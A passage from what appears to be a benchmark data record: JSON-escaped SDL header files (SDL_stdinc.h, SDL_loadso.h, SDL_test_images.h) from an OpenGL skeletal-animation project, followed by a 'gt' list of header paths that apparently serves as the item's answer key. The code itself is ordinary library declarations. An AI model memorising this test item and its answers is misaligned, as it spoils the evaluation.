(SDL_static_cast(Uint32, SDL_static_cast(Uint8, (C))) << 16) | \\\n     (SDL_static_cast(Uint32, SDL_static_cast(Uint8, (D))) << 24))\n\n\n\n\ntypedef enum\n{\n    SDL_FALSE = 0,\n    SDL_TRUE = 1\n} SDL_bool;\n\n\ntypedef int8_t Sint8;\n\ntypedef uint8_t Uint8;\n\ntypedef int16_t Sint16;\n\ntypedef uint16_t Uint16;\n\ntypedef int32_t Sint32;\n\ntypedef uint32_t Uint32;\n\n\ntypedef int64_t Sint64;\n\ntypedef uint64_t Uint64;\n\n\n#ifndef SDL_PRIs64\n#ifdef PRIs64\n#define SDL_PRIs64 PRIs64\n#elif defined(__WIN32__)\n#define SDL_PRIs64 \"I64d\"\n#elif defined(__LINUX__) && defined(__LP64__)\n#define SDL_PRIs64 \"ld\"\n#else\n#define SDL_PRIs64 \"lld\"\n#endif\n#endif\n#ifndef SDL_PRIu64\n#ifdef PRIu64\n#define SDL_PRIu64 PRIu64\n#elif defined(__WIN32__)\n#define SDL_PRIu64 \"I64u\"\n#elif defined(__LINUX__) && defined(__LP64__)\n#define SDL_PRIu64 \"lu\"\n#else\n#define SDL_PRIu64 \"llu\"\n#endif\n#endif\n#ifndef SDL_PRIx64\n#ifdef PRIx64\n#define SDL_PRIx64 PRIx64\n#elif defined(__WIN32__)\n#define SDL_PRIx64 \"I64x\"\n#elif defined(__LINUX__) && defined(__LP64__)\n#define SDL_PRIx64 \"lx\"\n#else\n#define SDL_PRIx64 \"llx\"\n#endif\n#endif\n#ifndef SDL_PRIX64\n#ifdef PRIX64\n#define SDL_PRIX64 PRIX64\n#elif defined(__WIN32__)\n#define SDL_PRIX64 \"I64X\"\n#elif defined(__LINUX__) && defined(__LP64__)\n#define SDL_PRIX64 \"lX\"\n#else\n#define SDL_PRIX64 \"llX\"\n#endif\n#endif\n\n\n#ifdef SDL_DISABLE_ANALYZE_MACROS\n#define SDL_IN_BYTECAP(x)\n#define SDL_INOUT_Z_CAP(x)\n#define SDL_OUT_Z_CAP(x)\n#define SDL_OUT_CAP(x)\n#define SDL_OUT_BYTECAP(x)\n#define SDL_OUT_Z_BYTECAP(x)\n#define SDL_PRINTF_FORMAT_STRING\n#define SDL_SCANF_FORMAT_STRING\n#define SDL_PRINTF_VARARG_FUNC( fmtargnumber )\n#define SDL_SCANF_VARARG_FUNC( fmtargnumber )\n#else\n#if defined(_MSC_VER) && (_MSC_VER >= 1600)\n#include <sal.h>\n\n#define SDL_IN_BYTECAP(x) _In_bytecount_(x)\n#define SDL_INOUT_Z_CAP(x) _Inout_z_cap_(x)\n#define SDL_OUT_Z_CAP(x) _Out_z_cap_(x)\n#define SDL_OUT_CAP(x) _Out_cap_(x)\n#define SDL_OUT_BYTECAP(x) _Out_bytecap_(x)\n#define SDL_OUT_Z_BYTECAP(x) _Out_z_bytecap_(x)\n\n#define SDL_PRINTF_FORMAT_STRING _Printf_format_string_\n#define SDL_SCANF_FORMAT_STRING _Scanf_format_string_impl_\n#else\n#define SDL_IN_BYTECAP(x)\n#define SDL_INOUT_Z_CAP(x)\n#define SDL_OUT_Z_CAP(x)\n#define SDL_OUT_CAP(x)\n#define SDL_OUT_BYTECAP(x)\n#define SDL_OUT_Z_BYTECAP(x)\n#define SDL_PRINTF_FORMAT_STRING\n#define SDL_SCANF_FORMAT_STRING\n#endif\n#if defined(__GNUC__)\n#define SDL_PRINTF_VARARG_FUNC( fmtargnumber ) __attribute__ (( format( __printf__, fmtargnumber, fmtargnumber+1 )))\n#define SDL_SCANF_VARARG_FUNC( fmtargnumber ) __attribute__ (( format( __scanf__, fmtargnumber, fmtargnumber+1 )))\n#else\n#define SDL_PRINTF_VARARG_FUNC( fmtargnumber )\n#define SDL_SCANF_VARARG_FUNC( fmtargnumber )\n#endif\n#endif\n\n#define SDL_COMPILE_TIME_ASSERT(name, x)               \\\n       typedef int SDL_dummy_ ## name[(x) * 2 - 1]\n\n#ifndef DOXYGEN_SHOULD_IGNORE_THIS\nSDL_COMPILE_TIME_ASSERT(uint8, sizeof(Uint8) == 1);\nSDL_COMPILE_TIME_ASSERT(sint8, sizeof(Sint8) == 1);\nSDL_COMPILE_TIME_ASSERT(uint16, sizeof(Uint16) == 2);\nSDL_COMPILE_TIME_ASSERT(sint16, sizeof(Sint16) == 2);\nSDL_COMPILE_TIME_ASSERT(uint32, sizeof(Uint32) == 4);\nSDL_COMPILE_TIME_ASSERT(sint32, sizeof(Sint32) == 4);\nSDL_COMPILE_TIME_ASSERT(uint64, sizeof(Uint64) == 8);\nSDL_COMPILE_TIME_ASSERT(sint64, sizeof(Sint64) == 8);\n#endif\n\n\n\n\n\n#ifndef DOXYGEN_SHOULD_IGNORE_THIS\n#if !defined(__ANDROID__)\n\ntypedef enum\n{\n    DUMMY_ENUM_VALUE\n} SDL_DUMMY_ENUM;\n\nSDL_COMPILE_TIME_ASSERT(enum, sizeof(SDL_DUMMY_ENUM) == sizeof(int));\n#endif\n#endif\n\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n#if defined(HAVE_ALLOCA) && !defined(alloca)\n# if defined(HAVE_ALLOCA_H)\n#  include <alloca.h>\n# elif defined(__GNUC__)\n#  define alloca __builtin_alloca\n# elif defined(_MSC_VER)\n#  include <malloc.h>\n#  define alloca _alloca\n# elif defined(__WATCOMC__)\n#  include <malloc.h>\n# elif defined(__BORLANDC__)\n#  include <malloc.h>\n# elif defined(__DMC__)\n#  include <stdlib.h>\n# elif defined(__AIX__)\n#pragma alloca\n# elif defined(__MRC__)\nvoid *alloca(unsigned);\n# else\nchar *alloca();\n# endif\n#endif\n#ifdef HAVE_ALLOCA\n#define SDL_stack_alloc(type, count)    (type*)alloca(sizeof(type)*(count))\n#define SDL_stack_free(data)\n#else\n#define SDL_stack_alloc(type, count)    (type*)SDL_malloc(sizeof(type)*(count))\n#define SDL_stack_free(data)            SDL_free(data)\n#endif\n\nextern DECLSPEC void *SDLCALL SDL_malloc(size_t size);\nextern DECLSPEC void *SDLCALL SDL_calloc(size_t nmemb, size_t size);\nextern DECLSPEC void *SDLCALL SDL_realloc(void *mem, size_t size);\nextern DECLSPEC void SDLCALL SDL_free(void *mem);\n\nextern DECLSPEC char *SDLCALL SDL_getenv(const char *name);\nextern DECLSPEC int SDLCALL SDL_setenv(const char *name, const char *value, int overwrite);\n\nextern DECLSPEC void SDLCALL SDL_qsort(void *base, size_t nmemb, size_t size, int (*compare) (const void *, const void *));\n\nextern DECLSPEC int SDLCALL SDL_abs(int x);\n\n\n\n#define SDL_min(x, y) (((x) < (y)) ? (x) : (y))\n#define SDL_max(x, y) (((x) > (y)) ? (x) : (y))\n\nextern DECLSPEC int SDLCALL SDL_isdigit(int x);\nextern DECLSPEC int SDLCALL SDL_isspace(int x);\nextern DECLSPEC int SDLCALL SDL_toupper(int x);\nextern DECLSPEC int SDLCALL SDL_tolower(int x);\n\nextern DECLSPEC void *SDLCALL SDL_memset(SDL_OUT_BYTECAP(len) void *dst, int c, size_t len);\n\n#define SDL_zero(x) SDL_memset(&(x), 0, sizeof((x)))\n#define SDL_zerop(x) SDL_memset((x), 0, sizeof(*(x)))\n\n\nSDL_FORCE_INLINE void SDL_memset4(void *dst, Uint32 val, size_t dwords)\n{\n#if defined(__GNUC__) && defined(i386)\n    int u0, u1, u2;\n    __asm__ __volatile__ (\n        \"cld \\n\\t\"\n        \"rep ; stosl \\n\\t\"\n        : \"=&D\" (u0), \"=&a\" (u1), \"=&c\" (u2)\n        : \"0\" (dst), \"1\" (val), \"2\" (SDL_static_cast(Uint32, dwords))\n        : \"memory\"\n    );\n#else\n    size_t _n = (dwords + 3) / 4;\n    Uint32 *_p = SDL_static_cast(Uint32 *, dst);\n    Uint32 _val = (val);\n    if (dwords == 0)\n        return;\n    switch (dwords % 4)\n    {\n        case 0: do {    *_p++ = _val;\n        case 3:         *_p++ = _val;\n        case 2:         *_p++ = _val;\n        case 1:         *_p++ = _val;\n        } while ( --_n );\n    }\n#endif\n}\n\n\nextern DECLSPEC void *SDLCALL SDL_memcpy(SDL_OUT_BYTECAP(len) void *dst, SDL_IN_BYTECAP(len) const void *src, size_t len);\n\nextern DECLSPEC void *SDLCALL SDL_memmove(SDL_OUT_BYTECAP(len) void *dst, SDL_IN_BYTECAP(len) const void *src, size_t len);\nextern DECLSPEC int SDLCALL SDL_memcmp(const void *s1, const void *s2, size_t len);\n\nextern DECLSPEC size_t SDLCALL SDL_wcslen(const wchar_t *wstr);\nextern DECLSPEC size_t SDLCALL SDL_wcslcpy(SDL_OUT_Z_CAP(maxlen) wchar_t *dst, const wchar_t *src, size_t maxlen);\nextern DECLSPEC size_t SDLCALL SDL_wcslcat(SDL_INOUT_Z_CAP(maxlen) wchar_t *dst, const wchar_t *src, size_t maxlen);\n\nextern DECLSPEC size_t SDLCALL SDL_strlen(const char *str);\nextern DECLSPEC size_t SDLCALL SDL_strlcpy(SDL_OUT_Z_CAP(maxlen) char *dst, const char *src, size_t maxlen);\nextern DECLSPEC size_t SDLCALL SDL_utf8strlcpy(SDL_OUT_Z_CAP(dst_bytes) char *dst, const char *src, size_t dst_bytes);\nextern DECLSPEC size_t SDLCALL SDL_strlcat(SDL_INOUT_Z_CAP(maxlen) char *dst, const char *src, size_t maxlen);\nextern DECLSPEC char *SDLCALL SDL_strdup(const char *str);\nextern DECLSPEC char *SDLCALL SDL_strrev(char *str);\nextern DECLSPEC char *SDLCALL SDL_strupr(char *str);\nextern DECLSPEC char *SDLCALL SDL_strlwr(char *str);\nextern DECLSPEC char *SDLCALL SDL_strchr(const char *str, int c);\nextern DECLSPEC char *SDLCALL SDL_strrchr(const char *str, int c);\nextern DECLSPEC char *SDLCALL SDL_strstr(const char *haystack, const char *needle);\n\nextern DECLSPEC char *SDLCALL SDL_itoa(int value, char *str, int radix);\nextern DECLSPEC char *SDLCALL SDL_uitoa(unsigned int value, char *str, int radix);\nextern DECLSPEC char *SDLCALL SDL_ltoa(long value, char *str, int radix);\nextern DECLSPEC char *SDLCALL SDL_ultoa(unsigned long value, char *str, int radix);\nextern DECLSPEC char *SDLCALL SDL_lltoa(Sint64 value, char *str, int radix);\nextern DECLSPEC char *SDLCALL SDL_ulltoa(Uint64 value, char *str, int radix);\n\nextern DECLSPEC int SDLCALL SDL_atoi(const char *str);\nextern DECLSPEC double SDLCALL SDL_atof(const char *str);\nextern DECLSPEC long SDLCALL SDL_strtol(const char *str, char **endp, int base);\nextern DECLSPEC unsigned long SDLCALL SDL_strtoul(const char *str, char **endp, int base);\nextern DECLSPEC Sint64 SDLCALL SDL_strtoll(const char *str, char **endp, int base);\nextern DECLSPEC Uint64 SDLCALL SDL_strtoull(const char *str, char **endp, int base);\nextern DECLSPEC double SDLCALL SDL_strtod(const char *str, char **endp);\n\nextern DECLSPEC int SDLCALL SDL_strcmp(const char *str1, const char *str2);\nextern DECLSPEC int SDLCALL SDL_strncmp(const char *str1, const char *str2, size_t maxlen);\nextern DECLSPEC int SDLCALL SDL_strcasecmp(const char *str1, const char *str2);\nextern DECLSPEC int SDLCALL SDL_strncasecmp(const char *str1, const char *str2, size_t len);\n\nextern DECLSPEC int SDLCALL SDL_sscanf(const char *text, SDL_SCANF_FORMAT_STRING const char *fmt, ...) SDL_SCANF_VARARG_FUNC(2);\nextern DECLSPEC int SDLCALL SDL_vsscanf(const char *text, const char *fmt, va_list ap);\nextern DECLSPEC int SDLCALL SDL_snprintf(SDL_OUT_Z_CAP(maxlen) char *text, size_t maxlen, SDL_PRINTF_FORMAT_STRING const char *fmt, ... ) SDL_PRINTF_VARARG_FUNC(3);\nextern DECLSPEC int SDLCALL SDL_vsnprintf(SDL_OUT_Z_CAP(maxlen) char *text, size_t maxlen, const char *fmt, va_list ap);\n\n#ifndef HAVE_M_PI\n#ifndef M_PI\n#define M_PI    3.14159265358979323846264338327950288\n#endif\n#endif\n\nextern DECLSPEC double SDLCALL SDL_acos(double x);\nextern DECLSPEC double SDLCALL SDL_asin(double x);\nextern DECLSPEC double SDLCALL SDL_atan(double x);\nextern DECLSPEC double SDLCALL SDL_atan2(double x, double y);\nextern DECLSPEC double SDLCALL SDL_ceil(double x);\nextern DECLSPEC double SDLCALL SDL_copysign(double x, double y);\nextern DECLSPEC double SDLCALL SDL_cos(double x);\nextern DECLSPEC float SDLCALL SDL_cosf(float x);\nextern DECLSPEC double SDLCALL SDL_fabs(double x);\nextern DECLSPEC double SDLCALL SDL_floor(double x);\nextern DECLSPEC double SDLCALL SDL_log(double x);\nextern DECLSPEC double SDLCALL SDL_pow(double x, double y);\nextern DECLSPEC double SDLCALL SDL_scalbn(double x, int n);\nextern DECLSPEC double SDLCALL SDL_sin(double x);\nextern DECLSPEC float SDLCALL SDL_sinf(float x);\nextern DECLSPEC double SDLCALL SDL_sqrt(double x);\nextern DECLSPEC float SDLCALL SDL_sqrtf(float x);\nextern DECLSPEC double SDLCALL SDL_tan(double x);\nextern DECLSPEC float SDLCALL SDL_tanf(float x);\n\n\n#define SDL_ICONV_ERROR     (size_t)-1\n#define SDL_ICONV_E2BIG     (size_t)-2\n#define SDL_ICONV_EILSEQ    (size_t)-3\n#define SDL_ICONV_EINVAL    (size_t)-4\n\n\ntypedef struct _SDL_iconv_t *SDL_iconv_t;\nextern DECLSPEC SDL_iconv_t SDLCALL SDL_iconv_open(const char *tocode,\n                                                   const char *fromcode);\nextern DECLSPEC int SDLCALL SDL_iconv_close(SDL_iconv_t cd);\nextern DECLSPEC size_t SDLCALL SDL_iconv(SDL_iconv_t cd, const char **inbuf,\n                                         size_t * inbytesleft, char **outbuf,\n                                         size_t * outbytesleft);\n\nextern DECLSPEC char *SDLCALL SDL_iconv_string(const char *tocode,\n                                               const char *fromcode,\n                                               const char *inbuf,\n                                               size_t inbytesleft);\n#define SDL_iconv_utf8_locale(S)    SDL_iconv_string(\"\", \"UTF-8\", S, SDL_strlen(S)+1)\n#define SDL_iconv_utf8_ucs2(S)      (Uint16 *)SDL_iconv_string(\"UCS-2-INTERNAL\", \"UTF-8\", S, SDL_strlen(S)+1)\n#define SDL_iconv_utf8_ucs4(S)      (Uint32 *)SDL_iconv_string(\"UCS-4-INTERNAL\", \"UTF-8\", S, SDL_strlen(S)+1)\n\n\n#if defined(__clang_analyzer__) && !defined(SDL_DISABLE_ANALYZE_MACROS)\n#define SDL_malloc malloc\n#define SDL_calloc calloc\n#define SDL_realloc realloc\n#define SDL_free free\n#define SDL_memset memset\n#define SDL_memcpy memcpy\n#define SDL_memmove memmove\n#define SDL_memcmp memcmp\n#define SDL_strlen strlen\n#define SDL_strlcpy strlcpy\n#define SDL_strlcat strlcat\n#define SDL_strdup strdup\n#define SDL_strchr strchr\n#define SDL_strrchr strrchr\n#define SDL_strstr strstr\n#define SDL_strcmp strcmp\n#define SDL_strncmp strncmp\n#define SDL_strcasecmp strcasecmp\n#define SDL_strncasecmp strncasecmp\n#define SDL_sscanf sscanf\n#define SDL_vsscanf vsscanf\n#define SDL_snprintf snprintf\n#define SDL_vsnprintf vsnprintf\n#endif\n\nSDL_FORCE_INLINE void *SDL_memcpy4(SDL_OUT_BYTECAP(dwords*4) void *dst, SDL_IN_BYTECAP(dwords*4) const void *src, size_t dwords)\n{\n    return SDL_memcpy(dst, src, dwords * 4);\n}\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_loadso.h'\n:\n\n\n\n#ifndef _SDL_loadso_h\n#define _SDL_loadso_h\n\n#include \"SDL_stdinc.h\"\n#include \"SDL_error.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\nextern DECLSPEC void *SDLCALL SDL_LoadObject(const char *sofile);\n\n\nextern DECLSPEC void *SDLCALL SDL_LoadFunction(void *handle,\n                                               const char *name);\n\n\nextern DECLSPEC void SDLCALL SDL_UnloadObject(void *handle);\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_images.h'\n:\n\n\n\n\n\n#ifndef _SDL_test_images_h\n#define _SDL_test_images_h\n\n#include \"SDL.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\ntypedef struct SDLTest_SurfaceImage_s {\n  int width;\n  int height;\n  unsigned int bytes_per_pixel;\n  const char *pixel_data;\n} SDLTest_SurfaceImage_t;\n\n\nSDL_Surface *SDLTest_ImageBlit();\nSDL_Surface *SDLTest_ImageBlitColor();\nSDL_Surface *SDLTest_ImageBlitAlpha();\nSDL_Surface *SDLTest_ImageBlitBlendAdd();\nSDL_Surface *SDLTest_ImageBlitBlend();\nSDL_Surface *SDLTest_ImageBlitBlendMod();\nSDL_Surface *SDLTest_ImageBlitBlendNone();\nSDL_Surface *SDLTest_ImageBlitBlendAll();\nSDL_Surface *SDLTest_ImageFace();\nSDL_Surface *SDLTest_ImagePrimitives();\nSDL_Surface *SDLTest_ImagePrimitivesBlend();\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n",
        "gt": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_stdinc.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_loadso.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_images.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'"
        ]
    }
]